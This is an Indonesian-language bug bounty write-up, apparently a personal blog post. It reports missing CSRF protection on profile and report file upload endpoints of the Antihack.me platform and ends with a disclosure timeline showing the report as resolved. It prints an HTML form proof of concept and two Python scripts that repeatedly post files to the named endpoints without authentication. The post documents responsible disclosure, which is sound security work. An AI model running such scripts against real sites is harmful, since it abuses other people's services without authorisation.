---
layout: post
title: "[Bug Bounty] Antihack.me CSRF File Upload Vulnerability"
date: 2019-01-09 07:00
categories: bugbounty
---
<div align="center">
    <img src="https://github.com/zetc0de/zetc0de.github.io/blob/master/assets/images/BugBounty/antihack/logo.png?raw=true">
</div>


## CSFR On Profile Image File Upload
Antihack.me merupakan sebuah website Bug Bounty Platform asal singapura. Setelah mendaftarkan user baru dan login ke aplikasi, kita dapat mengatur profile kita sebagai bug hunter, termasuk juga setting avatar/photo profile. Tertarik dengan fitur upload imagenya, kita coba intercept request upload image tersebut.

<div align="center">
    <img src="https://github.com/zetc0de/zetc0de.github.io/blob/master/assets/images/BugBounty/antihack/csrf1/burp.png?raw=true">
</div>

Terlihat disana beberapa parameter yang dikirimkan, akan tetapi disana tidak ada csrf protection, artinya siapapun dapat mengakses fitur upload ini, sekalipun dia tidak memepunyai akses ke akun manapun.

Lalu kami coba test request dengan html:
```
<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<title>CSRF File Upload</title>
</head>
<body>
	<form action="https://www.antihack.me/php/img_save_to_file_hacker.php" method="POST" name="csrf" enctype="multipart/form-data">
		<input type="file" name="img">
		<input name="HOST" value="AntiHACK">
		<input type="submit" value="Kirim">
	</form>
</body>
</html>
```

Lalu kami request dengan secript diatas dan didapatkan file berhasil diupload dengan baik. 
<div align="center">
    <img src="https://github.com/zetc0de/zetc0de.github.io/blob/master/assets/images/BugBounty/antihack/csrf1/hasil%20html.png?raw=true">
</div>

Lalu kami coba buat script csrf dengan python:
```
#!/usr/bin/python3

import requests

headers = {
	'Origin':'www.antihack.me'
}
files = {
        'img': open("/home/zetc0de/Documents/antihack/antihack/csrf/security.png", 'rb') 
        }
data = {
	"HOST":"AntiHACK"
}

for i in range(3):
	r = requests.post("https://www.antihack.me/php/img_save_to_file_hacker.php",files=files, headers=headers, data=data)
	print(r.text)
```
Ketika dieksekusi, file terupload dengan baik.

<div align="center">
    <img src="https://github.com/zetc0de/zetc0de.github.io/blob/master/assets/images/BugBounty/antihack/csrf1/hasil%20python.png?raw=true">
</div>

## CSRF On Report And Comment File Upload

Sepertihalnya platform bug bounty pada umumnya, disana terdapat fitur untuk melakukan reporting terkait celah keamanan yang ditemukan. Didalam fitur reporting tersebut terdapat beberapa fungsi editing, tak lupa fungsi upload file gambar/video juga disertakan guna kelengkapan report. 

Dengan script python:
```
#!/usr/bin/python3

import requests


files = {
        'files[]': open("/home/zetc0de/Documents/antihack/antihack/csrf/security.png", 'rb') 
        }

for i in range(5):
	r = requests.post("https://www.antihack.me/php/ajax_upload_file_company_new.php",files=files)
	print(r.text)


```

Didapatkan result sebagai berikut:

<div align="center">
    <img src="https://github.com/zetc0de/zetc0de.github.io/blob/master/assets/images/BugBounty/antihack/csrf2/2018-12-27_21-11.png?raw=true">
</div>

```
2018-12-28: Bug reported
2018-12-29: Triaged
2019-01-09: Report Resolved
2019-01-09: Swag Rewarded
```